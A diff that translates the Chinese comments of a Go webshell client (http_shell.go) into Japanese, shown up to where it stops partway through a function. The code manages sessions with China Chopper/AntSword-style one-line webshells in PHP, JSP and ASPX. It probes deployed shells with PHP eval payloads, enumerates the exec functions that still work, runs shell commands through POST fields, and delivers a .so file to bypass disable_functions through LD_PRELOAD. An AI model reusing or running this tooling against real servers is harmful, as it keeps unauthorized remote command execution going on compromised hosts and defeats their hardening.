@@ -1,18 +1,18 @@
-// http_shell.go 是 HTTP 一句话马会话驱动（菜刀/蚁剑式 POST 协议）,期 1a 重点。
+// http_shell.go は HTTP ワンライナー WebShell のセッション駆動（中国菜刀/AntSword 形式の POST プロトコル）で、フェーズ 1a の重点。
 //
-// 支持马型（协议族通用实现，无任何特定目标值）:
-//   - PHP 一句话（eval 型）:POST 密码字段，值为 PHP 代码。eval / assert 两族都按
-//     「代码执行字段」通信（PHP7 assert(string) 同样求值）,family 由 debug_backtrace
-//     探针分辨；命令执行函数按 exec→shell_exec→system→passthru 探测并记住可用者。
-//     exec 系全禁（disable_functions）时自动探测内建 LD_PRELOAD 绕过（见 bypass.go)。
-//   - PHP 命令马（cmdshell,lang=phpcmd):POST 密码字段，值直接是 shell 命令，
-//     马体直接 exec 并回显 stdout（无 PHP eval)。复盘 R1：此前探针只认 eval 型，
-//     命令马全灭并被 lang:auto 误判成 JSP。
-//   - JSP 一句话：POST 密码字段，值为 shell 命令（Runtime.exec("/bin/sh","-c",cmd))。
-//   - ASPX 一句话：POST 密码字段，值为 shell 命令（cmd.exe /c)。
+// 対応する WebShell 種別（プロトコルファミリー共通の実装で、特定のターゲット値には依存しない）:
+//   - PHP ワンライナー（eval 型）:POST のパスワードフィールドに値として PHP コードを送る。eval / assert の両ファミリーを
+//     「コード実行フィールド」として通信する（PHP7 の assert(string) も同様に評価される）。family は debug_backtrace
+//     プローブで判別し、コマンド実行関数は exec→shell_exec→system→passthru の順に探って使用可能なものを記憶する。
+//     exec 系がすべて禁止（disable_functions）の場合は内蔵の LD_PRELOAD バイパスを自動で探る（bypass.go を参照）。
+//   - PHP コマンドシェル（cmdshell、lang=phpcmd）:POST のパスワードフィールドに値として shell コマンドを直接送る。
+//     WebShell 本体が直接 exec して stdout を返す（PHP eval なし）。振り返り R1:以前のプローブは eval 型しか認識せず、
+//     コマンドシェルが全滅し、lang:auto で JSP と誤判定されていた。
+//   - JSP ワンライナー：POST のパスワードフィールドに値として shell コマンドを送る（Runtime.exec("/bin/sh","-c",cmd)）。
+//   - ASPX ワンライナー：POST のパスワードフィールドに値として shell コマンドを送る（cmd.exe /c）。
 //
-// 所有执行回显用「每次请求随机生成的哨兵对」包裹：起始/结束 marker 都命中才取信
-// 中间内容；缺失即视为失败（函数被禁/WAF 拦截/马失效）,返回带语义的错误。
+// すべての実行エコー出力は「リクエストごとにランダム生成するセンチネル対」で包む:開始/終了の marker が両方ヒットした場合のみ
+// 中間の内容を採用する。欠落は失敗とみなし（関数禁止/WAF ブロック/WebShell 失効）、意味の分かるエラーを返す。
 package session
 
 import (
@@ -29,66 +29,66 @@ import (
 	"time"
 )
 
-// ChunkSize 是文件读写的分块大小（64KB 原文,base64 后约 85KB)。
-// 上限依据:Linux execve 单参数上限 MAX_ARG_STRLEN=128KB——写入经 `/bin/sh -c`
-// 内联 base64 时命令行即单个参数,512KB 块(b64 ~700KB)会必炸 E2BIG
-// (实战:Tomcat JSP 马 256KB 内联即 HTTP 500;PHP exec 族同理)。
-// 加密马的 read/write op 走 JSON POST body 不受此限,见 http_shell_enc.go。
+// ChunkSize はファイル読み書きのチャンクサイズ（64KB の元データ、base64 後は約 85KB）。
+// 上限の根拠：Linux の execve では単一引数が MAX_ARG_STRLEN=128KB まで——書き込みが `/bin/sh -c`
+// 経由のインライン base64 で書き込むとコマンドラインが単一引数になり、512KB のチャンク（b64 で ~700KB）は必ず E2BIG で落ちる
+// （実運用では Tomcat の JSP WebShell が 256KB のインラインで HTTP 500、PHP exec 系も同様）。
+// 暗号化 WebShell の read/write op は JSON POST body 経由でこの制限を受けない。http_shell_enc.go を参照。
 const ChunkSize = 64 * 1024
 
 const (
 	defaultHTTPTimeout = 15 * time.Second
-	maxBodyRead        = 8 << 20 // 单次响应最大读取（分块设计下远超实际需要）
+	maxBodyRead        = 8 << 20 // 1 レスポンスあたりの最大読み取り（チャンク設計では実需要を大きく上回る）
 )
 
-// phpExecFuncs 是 PHP 命令执行函数的优先级顺序（探测与降级都按此）。
+// phpExecFuncs は PHP コマンド実行関数の優先順位（プローブも降格もこれに従う）。
 var phpExecFuncs = []string{"exec", "shell_exec", "system", "passthru"}
 
-// ProbeInfo 是 register_session 探测返回的马型指纹。
+// ProbeInfo は register_session のプローブが返す WebShell 種別のフィンガープリント。
 type ProbeInfo struct {
 	Kind     string   `json:"kind"`     // http_php / http_phpcmd / http_jsp / http_aspx
 	Lang     string   `json:"lang"`     // php / phpcmd / jsp / aspx
-	Variant  string   `json:"variant"`  // php: eval | assert;phpcmd: cmd;其它为空
-	Funcs    []string `json:"funcs"`    // php: 可用执行函数（按优先级序）;其它为空
-	Platform string   `json:"platform"` // linux | windows（尽力探测，默认按语言族）
+	Variant  string   `json:"variant"`  // php: eval | assert;phpcmd: cmd;その他は空
+	Funcs    []string `json:"funcs"`    // php: 使用可能な実行関数（優先順位順）;その他は空
+	Platform string   `json:"platform"` // linux | windows（可能な範囲でプローブし、デフォルトは言語ファミリーによる）
 
-	// PHP eval 马的 disable_functions 指纹与内建绕过探测结论（见 bypass.go)。
-	DisableFunctions bool   `json:"disable_functions,omitempty"` // exec 系全禁
-	Mail             bool   `json:"mail,omitempty"`              // mail() 可用
-	Putenv           bool   `json:"putenv,omitempty"`            // putenv() 可用
-	Bypass           string `json:"bypass,omitempty"`            // 已确认可用的绕过:ld_preload
-	BypassLib        string `json:"bypass_lib,omitempty"`        // 已投递到目标侧的 .so 路径
-	BypassNote       string `json:"bypass_note,omitempty"`       // 绕过探测结论（含不可用原因）
+	// PHP eval WebShell の disable_functions フィンガープリントと内蔵バイパスプローブの結論（bypass.go を参照）。
+	DisableFunctions bool   `json:"disable_functions,omitempty"` // exec 系がすべて禁止
+	Mail             bool   `json:"mail,omitempty"`              // mail() が使用可能
+	Putenv           bool   `json:"putenv,omitempty"`            // putenv() が使用可能
+	Bypass           string `json:"bypass,omitempty"`            // 使用可能と確認済みのバイパス：ld_preload
+	BypassLib        string `json:"bypass_lib,omitempty"`        // ターゲット側へ配備済みの .so パス
+	BypassNote       string `json:"bypass_note,omitempty"`       // バイパスプローブの結論（使用不可の理由を含む）
 }
 
-// HTTPShell 是一句话马会话。零值不可用，经 Probe / NewHTTPShell 构造。
+// HTTPShell はワンライナー WebShell のセッション。ゼロ値は使用不可で、Probe / NewHTTPShell で構築する。
 type HTTPShell struct {
 	id       int64
 	kind     string // http_php / http_phpcmd / http_jsp / http_aspx
 	url      string
-	password string // 连接密码 = POST 字段名
+	password string // 接続パスワード = POST フィールド名
 	lang     string // php / phpcmd / jsp / aspx
 	variant  string // php: eval | assert;phpcmd: cmd
 	platform string // linux | windows
 
 	mu    sync.RWMutex
-	funcs []string // php 可用执行函数（探测记忆，禁用变化时重探）
+	funcs []string // php の使用可能な実行関数（プローブの記憶、禁止状態が変わったら再プローブ）
 
-	// disable_functions 指纹与绕过登记（探测写入，恢复路径由 Secret 回填）。
+	// disable_functions フィンガープリントとバイパス登録（プローブ時に書き込み、復元経路では Secret から埋め戻す）。
 	disableFuncs bool
 	mailOK       bool
 	putenvOK     bool
-	bypass       string // 已确认可用:ld_preload
-	bypassLib    string // 已投递的 .so 目标侧路径（留口：后续 session_exec 走绕过执行）
+	bypass       string // 使用可能と確認済み：ld_preload
+	bypassLib    string // 配備済み .so のターゲット側パス（拡張点:後続の session_exec がバイパス実行を使う）
 
-	execMu sync.Mutex // per-session 执行串行锁（复盘 R5：同会话并发执行输出串台）
+	execMu sync.Mutex // セッション単位の実行直列化ロック（振り返り R5:同一セッションでの並行実行は出力が混線する）
 
 	client *http.Client
-	enc    *encTransport // 加密马（phpenc/jspenc）传输层；nil = 期 1a 明文表单
+	enc    *encTransport // 暗号化 WebShell（phpenc/jspenc）の伝送層。nil = フェーズ 1a の平文フォーム
 }
 
-// DirectHTTPClient 返回平台直连 HTTP 客户端：显式不走 HTTP_PROXY 等 env 代理
-// （目标侧请求由平台直连；worker 机器的代理 env 与本组件无关）。
+// DirectHTTPClient はプラットフォーム直結の HTTP クライアントを返す。HTTP_PROXY などの env プロキシを明示的に使わない
+// （ターゲット側へのリクエストはプラットフォームが直結する。worker マシンのプロキシ env は本コンポーネントとは無関係）。
 func DirectHTTPClient(timeout time.Duration) *http.Client {
 	if timeout <= 0 {
 		timeout = defaultHTTPTimeout
@@ -96,13 +96,13 @@ func DirectHTTPClient(timeout time.Duration) *http.Client {
 	return &http.Client{
 		Timeout: timeout,
 		Transport: &http.Transport{
-			Proxy: nil, // 不用 http.ProxyFromEnvironment:目标请求必须直连
+			Proxy: nil, // http.ProxyFromEnvironment は使わない:ターゲットへのリクエストは必ず直結する
 		},
 	}
 }
 
-// NewHTTPShell 由已知参数构造会话（DB 恢复路径：马型已探测过，不重复探测）。
-// lang: php / phpcmd / jsp / aspx。password 为空默认 "cmd"。
+// NewHTTPShell は既知のパラメータからセッションを構築する（DB 復元経路：WebShell 種別はプローブ済みなので再プローブしない）。
+// lang: php / phpcmd / jsp / aspx。password が空のときのデフォルトは "cmd"。
 func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
 	s := &HTTPShell{
 		url:      strings.TrimSpace(shellURL),
@@ -123,35 +123,35 @@ func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
 	case "aspx":
 		s.kind, s.platform = "http_aspx", "windows"
 	default:
-		return nil, opError("probe", "无法识别的 WebShell 语言: %q（支持 php/phpcmd/jsp/aspx)", lang)
+		return nil, opError("probe", "WebShell の言語を認識できません: %q（php/phpcmd/jsp/aspx に対応）", lang)
 	}
 	if _, err := url.ParseRequestURI(s.url); err != nil {
-		return nil, opError("probe", "非法 WebShell URL: %v", err)
+		return nil, opError("probe", "不正な WebShell URL: %v", err)
 	}
 	return s, nil
 }
 
-// SetID 在落库后回填 sessions 表主键。
+// SetID は永続化後に sessions テーブルの主キーを埋め戻す。
 func (s *HTTPShell) SetID(id int64) { s.id = id }
 
-// SetVariant 恢复已探测的 family(php: eval/assert)。
+// SetVariant はプローブ済みの family(php: eval/assert) を復元する。
 func (s *HTTPShell) SetVariant(v string) { s.variant = v }
 
-// SetPlatform 恢复已探测的平台。
+// SetPlatform はプローブ済みのプラットフォームを復元する。
 func (s *HTTPShell) SetPlatform(p string) {
 	if p == "linux" || p == "windows" {
 		s.platform = p
 	}
 }
 
-// SetFuncs 恢复已探测的 PHP 执行函数清单。
+// SetFuncs はプローブ済みの PHP 実行関数一覧を復元する。
 func (s *HTTPShell) SetFuncs(funcs []string) {
 	s.mu.Lock()
 	s.funcs = append([]string(nil), funcs...)
 	s.mu.Unlock()
 }
 
-// Funcs 返回探测到的 PHP 执行函数（副本）。
+// Funcs はプローブで得た PHP 実行関数を返す（コピー）。
 func (s *HTTPShell) Funcs() []string {
 	s.mu.RLock()
 	defer s.mu.RUnlock()
@@ -162,9 +162,9 @@ func (s *HTTPShell) ID() int64                   { return s.id }
 func (s *HTTPShell) Kind() string                { return s.kind }
 func (s *HTTPShell) Lang() string                { return s.lang }
 func (s *HTTPShell) URL() string                 { return s.url }
-func (s *HTTPShell) Close(context.Context) error { return nil } // HTTP 会话无资源
+func (s *HTTPShell) Close(context.Context) error { return nil } // HTTP セッションはリソースを持たない
 
-// Secret 是落库 secret JSON 的形态（连接参数，由 db 层加密存储）。
+// Secret は永続化する secret JSON の形（接続パラメータで、db 層が暗号化して保存する）。
 type Secret struct {
 	URL      string   `json:"url"`
 	Password string   `json:"password"`
@@ -172,19 +172,19 @@ type Secret struct {
 	Variant  string   `json:"variant,omitempty"`
 	Platform string   `json:"platform,omitempty"`
 	Funcs    []string `json:"funcs,omitempty"`
-	// disable_functions 指纹与绕过登记（复盘 R1：探测结果随 secret 落库，
-	// 比 sessions 表加列侵入小；恢复后免重探）。
+	// disable_functions フィンガープリントとバイパス登録（振り返り R1:プローブ結果は secret とともに永続化する。
+	// sessions テーブルへの列追加より侵襲が小さく、復元後は再プローブ不要）。
 	DisableFunctions bool   `json:"disable_functions,omitempty"`
 	Mail             bool   `json:"mail,omitempty"`
 	Putenv           bool   `json:"putenv,omitempty"`
 	Bypass           string `json:"bypass,omitempty"`
 	BypassLib        string `json:"bypass_lib,omitempty"`
-	// 加密马（phpenc/jspenc）专有：会话密钥（base64 32B）与锁存的加密模式。
+	// 暗号化 WebShell（phpenc/jspenc）専用:セッション鍵（base64 32B）と保存済みの暗号化モード。
 	Key     string `json:"key,omitempty"`
 	EncMode string `json:"enc_mode,omitempty"`
 }
 
-// Secret 导出当前连接参数（探测后的完整指纹）。
+// Secret は現在の接続パラメータを書き出す（プローブ後の完全なフィンガープリント）。
 func (s *HTTPShell) Secret() Secret {
 	sec := Secret{
 		URL: s.url, Password: s.password, Lang: s.lang,
@@ -199,8 +199,8 @@ func (s *HTTPShell) Secret() Secret {
 	return sec
 }
 
-// RestoreHTTPShell 由 DB secret 重建会话（启动恢复，不重新探测）。
-// secret 含 Key 时按加密马（phpenc/jspenc）恢复，并带回锁存的加密模式。
+// RestoreHTTPShell は DB の secret からセッションを再構築する（起動時の復元で、再プローブはしない）。
+// secret に Key が含まれる場合は暗号化 WebShell（phpenc/jspenc）として復元し、保存済みの暗号化モードも戻す。
 func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
 	var s *HTTPShell
 	var err error
@@ -227,17 +227,17 @@ func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
 	return s, nil
 }
 
-// ---------------- 传输 ----------------
+// ---------------- 伝送 ----------------
 
-// post 发一次表单 POST。网络层失败统一 *Error;响应体截断读取。
-// 加密马（s.enc != nil）改走加密传输：同一 payload 经 op=exec 密文通道。
+// post はフォーム POST を 1 回送る。ネットワーク層の失敗は一律 *Error。レスポンスボディは切り詰めて読む。
+// 暗号化 WebShell（s.enc != nil）は暗号化伝送に切り替える:同一 payload を op=exec の暗号文チャネルで送る。
 func (s *HTTPShell) post(ctx context.Context, fields url.Values, timeout time.Duration) (string, error) {
 	body, _, err := s.postH(ctx, fields, timeout)
 	return body, err
 }
 
-// postH 同 post，附带响应头（auto 判型要用通用头信号区分 phpcmd/jsp;
-// 加密马通道无明文响应头语义，恒返回 nil)。
+// postH は post と同じだがレスポンスヘッダも返す（auto 判定では汎用ヘッダの信号で phpcmd/jsp を区別する。
+// 暗号化 WebShell のチャネルには平文レスポンスヘッダの意味がなく、常に nil を返す）。
 func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.Duration) (string, http.Header, error) {
 	if s.enc != nil {
 		body, err := s.enc.exec(ctx, fields.Get(s.password), timeout)
@@ -251,30 +251,30 @@ func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.D
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.url,
 		strings.NewReader(fields.Encode()))
 	if err != nil {
-		return "", nil, opError("http", "构造请求失败: %v", err)
+		return "", nil, opError("http", "リクエストの構築に失敗しました: %v", err)
 	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
 	resp, err := s.client.Do(req)
 	if err != nil {
-		return "", nil, opError("http", "HTTP 请求失败（马不可达：目标宕机/超时/连接重置）: %v", err)
+		return "", nil, opError("http", "HTTP リクエストに失敗しました（WebShell に到達できません：ターゲットの停止/タイムアウト/接続リセット）: %v", err)
 	}
 	defer resp.Body.Close()
 	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
 	if err != nil {
-		return "", nil, opError("http", "读取响应失败: %v", err)
+		return "", nil, opError("http", "レスポンスの読み取りに失敗しました: %v", err)
 	}
 	if resp.StatusCode >= 400 {
-		return string(body), resp.Header, opError("http", "疑似被拦/马被删除：目标返回 HTTP %d: %s",
+		return string(body), resp.Header, opError("http", "ブロックされたか WebShell が削除された可能性があります：ターゲットが HTTP %d を返しました: %s",
 			resp.StatusCode, excerpt(string(body), 200))
 	}
 	return string(body), resp.Header, nil
 }
 
-// ---------------- 哨兵 ----------------
+// ---------------- センチネル ----------------
 
-// sentinel 是一次请求一对的随机哨兵。随机化防回显污染/粘连/误命中：
-// 固定 marker 会被目标输出里碰巧出现的同名字符串欺骗（PivotHub 的教训）。
+// sentinel は 1 リクエストにつき 1 対のランダムなセンチネル。ランダム化によりエコー出力の汚染/付着/誤ヒットを防ぐ:
+// 固定 marker はターゲット出力に偶然現れた同名文字列に騙される（PivotHub の教訓）。
 type sentinel struct{ start, end string }
 
 func newSentinel() sentinel {
@@ -284,8 +284,8 @@ func newSentinel() sentinel {
 	return sentinel{start: h[:8], end: h[8:] + h[:4]}
 }
 
-// extract 取出哨兵包裹的内容。start 取首次出现、end 取 start 之后的首次出现,
-// 防 start 粘连到目标输出尾部被误切。两个 marker 都在才可信。
+// extract はセンチネルで包まれた内容を取り出す。start は最初の出現、end は start より後の最初の出現をとり、
+// start がターゲット出力の末尾に付着して誤って切り出されるのを防ぐ。両方の marker が揃って初めて信用できる。
 func (m sentinel) extract(body string) (string, bool) {
 	i := strings.Index(body, m.start)
 	if i < 0 {
@@ -299,7 +299,7 @@ func (m sentinel) extract(body string) (string, bool) {
 	return rest[:j], true
 }
 
-// excerpt 截断回显摘要（报错用，防巨型 body 灌进上下文）。
+// excerpt はエコー出力の要約を切り詰める（エラー用で、巨大な body がコンテキストに流れ込むのを防ぐ）。
 func excerpt(s string, n int) string {
 	s = strings.TrimSpace(s)
 	if len(s) <= n {
@@ -310,11 +310,11 @@ func excerpt(s string, n int) string {
 
 func b64e(data []byte) string { return base64.StdEncoding.EncodeToString(data) }
 
-// ---------------- 探测 ----------------
+// ---------------- プローブ ----------------
 
-// Probe 探测 url 上的一句话马：发无害探针（echo 哨兵）,按回显判定马型与可用
-// 执行函数。lang 为 "auto" 时按「eval 探针与 cmd 探针分开打，谁的哨兵对就判谁」
-// 的顺序判型（见 probeAuto)。失败返回带探针回显摘要的错误，不伪造成功。
+// Probe は url 上のワンライナー WebShell をプローブする:無害なプローブ（echo センチネル）を送り、エコー出力から WebShell 種別と使用可能な
+// 実行関数を判定する。lang が "auto" の場合は「eval プローブと cmd プローブを別々に打ち、どちらのセンチネルが揃った方と判定する」
+// 順序で判定する（probeAuto を参照）。失敗時はプローブのエコー出力の要約を含むエラーを返し、成功を装わない。
 func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, ProbeInfo, error) {
 	lang = strings.ToLower(strings.TrimSpace(lang))
 	if lang == "" || lang == "auto" {
@@ -331,15 +331,15 @@ func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, Pr
 	return s, info, nil
 }
 
-// probeAuto 自动判型（复盘 R1 修正：旧实现 eval 探针会被 sh 命令马「字符串拼接」
-// 假象骗进 PHP 分支，最终把 PHP 命令马误判成 http_jsp)。顺序：
+// probeAuto は自動判定する（振り返り R1 の修正:旧実装の eval プローブは sh コマンドシェルの「文字列連結」
+// の偽装に騙されて PHP 分岐に入り、最終的に PHP コマンドシェルを http_jsp と誤判定していた）。順序:
 //
-//	① PHP eval 探针——PHP 专属语法（字符串拼接+算术求值）,sh 命令马吃不下；
-//	② sh 命令探针（一次）——命中即「POST 字段直接是 shell 命令」的命令马，
-//	  再按通用响应头信号区分 PHP 命令马（phpcmd)/Java 容器马（jsp):
-//	  X-Powered-By 含 PHP → phpcmd;JSESSIONID/容器签名 → jsp;
-//	  无信号默认 phpcmd（加固 PHP 常剥头，而两者执行通道同构，误判代价对称）;
-//	③ ASPX 探针——cmd.exe 专属（未定义变量展开为空）。
+//	① PHP eval プローブ——PHP 専用の構文（文字列連結+算術評価）で、sh コマンドシェルには解釈できない。
+//	② sh コマンドプローブ（1 回）——ヒットすれば「POST フィールドがそのまま shell コマンド」のコマンドシェルで、
+//	  さらに汎用レスポンスヘッダの信号で PHP コマンドシェル（phpcmd）/Java コンテナの WebShell（jsp）を区別する:
+//	  X-Powered-By に PHP → phpcmd;JSESSIONID/コンテナのシグネチャ → jsp;
+//	  信号なしのデフォルトは phpcmd（堅牢化した PHP はヘッダを落とすことが多く、両者の実行チャネルは同構造で誤判定のコストが対称）;
+//	③ ASPX プローブ——cmd.exe 専用（未定義の変数は空に展開される）。
 func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, ProbeInfo, error) {
 	var errs []string
 	if s, err := NewHTTPShell(shellURL, password, "php"); err == nil {
@@ -369,10 +369,10 @@ func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, Prob
 			errs = append(errs, fmt.Sprintf("[aspx] %v", perr))
 		}
 	}
-	return nil, ProbeInfo{}, opError("probe", "马型探测失败：%s", strings.Join(errs, "; "))
+	return nil, ProbeInfo{}, opError("probe", "WebShell 種別のプローブに失敗しました：%s", strings.Join(errs, "; "))
 }
 
-// probeCmdEcho 发一次 sh 命令回显探针，命中返回响应头（供 phpcmd/jsp 判型）。
+// probeCmdEcho は sh コマンドエコープローブを 1 回送り、ヒットしたらレスポンスヘッダを返す（phpcmd/jsp の判定用）。
 func probeCmdEcho(ctx context.Context, shellURL, password, platform string) (http.Header, error) {
 	s, err := NewHTTPShell(shellURL, password, "phpcmd")
 	if err != nil {
@@ -385,14 +385,14 @@ func probeCmdEcho(ctx context.Context, shellURL, password, platform string) (htt
 		return nil, err
 	}
 	if !strings.Contains(body, want) {
-		return nil, opError("probe", "命令探针哨兵未回显：不是命令执行型马（POST 字段不是 shell 命令），或响应被 WAF 改写。回显摘要: %q",
+		return nil, opError("probe", "コマンドプローブのセンチネルがエコー出力されません：コマンド実行型の WebShell ではない（POST フィールドが shell コマンドでない）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q",
 			excerpt(body, 200))
 	}
 	return hdr, nil
 }
 
-// phpServerHint 按通用响应头识别 PHP 服务端（X-Powered-By)。只认通用协议信号，
-// 无任何特定目标值。
+// phpServerHint は汎用レスポンスヘッダ（X-Powered-By）で PHP サーバを識別する。汎用プロトコルの信号だけを見て、
+// 特定のターゲット値には一切依存しない。
 func phpServerHint(h http.Header) bool {
 	if h == nil {
 		return false
@@ -400,8 +400,8 @@ func phpServerHint(h http.Header) bool {
 	return strings.Contains(strings.ToLower(h.Get("X-Powered-By")), "php")
 }
 
-// javaContainerHint 按通用响应头信号识别 Java 容器（JSESSIONID cookie、Server
-// 头容器签名、X-Powered-By 的 servlet/jsp)。
+// javaContainerHint は汎用レスポンスヘッダの信号で Java コンテナを識別する（JSESSIONID cookie、Server
+// ヘッダのコンテナシグネチャ、X-Powered-By の servlet/jsp）。
 func javaContainerHint(h http.Header) bool {
 	if h == nil {
 		return false
@@ -421,23 +421,23 @@ func javaContainerHint(h http.Header) bool {
 	return strings.Contains(powered, "servlet") || strings.Contains(powered, "jsp")
 }
 
-// probe 按已选语言探测并填充 variant/funcs/platform。
+// probe は選択済みの言語でプローブし、variant/funcs/platform を埋める。
 func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
 	info := ProbeInfo{Kind: s.kind, Lang: s.lang, Platform: s.platform}
 	switch s.lang {
 	case "php":
-		// 1) 存活探针:PHP 专属语法（字符串拼接 + 算术求值）。命令马把它当 shell
-		// 命令执行时 `(20+22)` 是语法错误，绝不可能回出 S42E——这是 eval 马与
-		// 命令马的分界（复盘 R1：旧探针 `echo "S"."E"` 会被 sh 拼接回显）。
+		// 1) 存続プローブ：PHP 専用の構文（文字列連結 + 算術評価）。コマンドシェルがこれを shell
+		// コマンドとして実行すると `(20+22)` は構文エラーになり、S42E を返すことは絶対にない——これが eval WebShell と
+		// コマンドシェルの境界（振り返り R1:旧プローブの `echo "S"."E"` は sh の連結でエコー出力されてしまう）。
 		m := newSentinel()
 		body, err := s.post(ctx, url.Values{s.password: {`echo "` + m.start + `".(20+22)."` + m.end + `";`}}, 0)
 		if err != nil {
 			return info, err
 		}
 		if !strings.Contains(body, m.start+"42"+m.end) {
-			return info, opError("probe", "eval 探针哨兵未回显：不是 PHP 代码执行型一句话（探针协议不匹配），或响应被 WAF 改写。回显摘要: %q", excerpt(body, 200))
+			return info, opError("probe", "eval プローブのセンチネルがエコー出力されません：PHP コード実行型のワンライナーではない（プローブプロトコルの不一致）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q", excerpt(body, 200))
 		}
-		// 2) family 分辨：debug_backtrace 首帧函数名 eval / assert。
+		// 2) family の判別：debug_backtrace の先頭フレームの関数名 eval / assert。
 		fm := newSentinel()
 		famPayload := `echo "` + fm.start + `";` +
 			`$bt=@debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS,1);` +
@@ -450,11 +450,11 @@ func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
 			}
 		}
 		if info.Variant != "assert" {
-			info.Variant = "eval" // 分辨失败按 eval（两者通信协议相同，仅上报语义）
+			info.Variant = "eval" // 判別失敗時は eval とみなす（両者の通信プロトコルは同じで、報告上の意味だけが異なる）
 		}
 		s.variant = info.Variant
-		// 3) 能力指纹：exec 系函数 + mail()/putenv() 可用性（无害 function_exists
-		// 探针，disable_functions 直接反映在结果里）。
+		// 3) 能力フィンガープリント：exec 系関数 + mail()/putenv() の可用性（無害な function_exists
+		// プローブで、disable_functions が結果にそのまま反映される）。
 		caps, err := s.probePHPCaps(ctx)
 		if err != nil {
 			return info, err
@@ -466,18 +466,18 @@ func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
 		if len(caps.funcs) == 0 {
 			info.DisableFunctions = true
 			s.disableFuncs = true
-			// 内建 LD_PRELOAD 绕过探测（复盘 R1):exec 全禁且 mail+putenv 可用
-			// 时投递预编译 freestanding .so 探活。失败不拖垮登记，原因进 BypassNote。
+			// 内蔵 LD_PRELOAD バイパスのプローブ（振り返り R1）:exec がすべて禁止かつ mail+putenv が使用可能な
+			// ときにプリコンパイル済みの freestanding .so を配備して疎通を探る。失敗しても登録は妨げず、理由は BypassNote に入れる。
 			if caps.mail && caps.putenv {
 				s.probeBypass(ctx, &info)
 			} else {
-				info.BypassNote = "mail()/putenv() 不全可用，LD_PRELOAD 绕过前提不满足"
+				info.BypassNote = "mail()/putenv() の両方が使用可能でなく、LD_PRELOAD バイパスの前提を満たしません"
 			}
 		}
 		return info, nil
 	case "phpcmd":
-		// 命令执行马：POST 字段直接是 shell 命令。与 JSP 通道同构（linux sh),
-		// 显式指定 phpcmd 时不再要求容器头信号。
+		// コマンド実行 WebShell:POST フィールドがそのまま shell コマンド。JSP チャネルと同構造（linux sh）で、
+		// phpcmd を明示指定した場合はコンテナヘッダの信号を要求しない。
 		if err := s.probeEcho(ctx, "linux"); err != nil {
 			return info, err
 		}
@@ -500,12 +500,12 @@ func (s *HTTPShell) probe(ctx context.Context) (ProbeInfo, error) {
 		info.Platform = "windows"
 		return info, nil
 	}
-	return info, opError("probe", "未支持的语言 %q", s.lang)
+	return info, opError("probe", "未対応の言語 %q", s.lang)
 }
 
-// echoProbeCommand 构造命令回显探针：linux 用 POSIX 算术展开 $((40+2))
-// (cmd.exe 原样输出，不符）;windows 用 cmd 批处理的未定义变量展开为空
-// (sh 原样输出 %VAR%，不符）。
+// echoProbeCommand はコマンドエコープローブを構築する：linux は POSIX の算術展開 $((40+2)) を使い
+// （cmd.exe ではそのまま出力されるので不一致）、windows は cmd バッチの未定義変数が空に展開されることを使い
+// （sh では %VAR% がそのまま出力されるので不一致）。
 func echoProbeCommand(m sentinel, platform string) (cmd, want string) {
 	if platform == "windows" {
 		return "echo " + m.start + "%ARTEX_PROBE_UNSET%" + m.end, m.start + m.end
@@ -513,7 +513,7 @@ func echoProbeCommand(m sentinel, platform string) (cmd, want string) {
 	return "echo " + m.start + "$((40+2))" + m.end + " 2>&1", m.start + "42" + m.end
 }
 
-// probeEcho 探测命令回显型马（phpcmd/JSP/ASPX)。探针带语言族特征，防 auto 探测互相误判。
+// probeEcho はコマンドエコー型の WebShell（phpcmd/JSP/ASPX）をプローブする。プローブは言語ファミリーの特徴を持ち、auto プローブ同士の誤判定を防ぐ。
 func (s *HTTPShell) probeEcho(ctx context.Context, platform string) error {
 	m := newSentinel()
 	cmd, want := echoProbeCommand(m, platform)
@@ -522,21 +522,21 @@ func (s *HTTPShell) probeEcho(ctx context.Context, platform string) error {
 		return err
 	}
 	if !strings.Contains(body, want) {
-		return opError("probe", "哨兵未回显：不是 %s 命令回显型一句话（探针协议不匹配），或响应被 WAF 改写。回显摘要: %q",
+		return opError("probe", "センチネルがエコー出力されません：%s のコマンドエコー型ワンライナーではない（プローブプロトコルの不一致）、またはレスポンスが WAF に書き換えられています。エコー出力の要約: %q",
 			strings.ToUpper(s.lang), excerpt(body, 200))
 	}
 	return nil
 }
 
-// phpCaps 是 PHP eval 马的能力指纹：可用执行函数 + mail/putenv 可用性。
+// phpCaps は PHP eval WebShell の能力フィンガープリント:使用可能な実行関数 + mail/putenv の可用性。
 type phpCaps struct {
 	funcs  []string
 	mail   bool
 	putenv bool
 }
 
-// probePHPCaps 枚举目标 PHP 可用的命令执行函数（按优先级序）与 mail()/putenv()
-// 可用性（LD_PRELOAD 绕过前提指纹，无害 function_exists 探针）。
+// probePHPCaps はターゲットの PHP で使用可能なコマンド実行関数（優先順位順）と mail()/putenv() の
+// 可用性を列挙する（LD_PRELOAD バイパス前提のフィンガープリント、無害な function_exists プローブ）。
 func (s *HTTPShell) probePHPCaps(ctx context.Context) (phpCaps, error) {
 	var caps phpCaps
 	m := newSentinel()
@@ -549,13 +549,13 @@ func (s *HTTPShell) probePHPCaps(ctx context.Context) (phpCaps, error) {
 	}
 	out, ok := m.extract(body)
 	if !ok {
-		return caps, opError("probe", "函数枚举哨兵缺失（疑似被 WAF 拦截/改写）。回显摘要: %q", excerpt(body, 200))
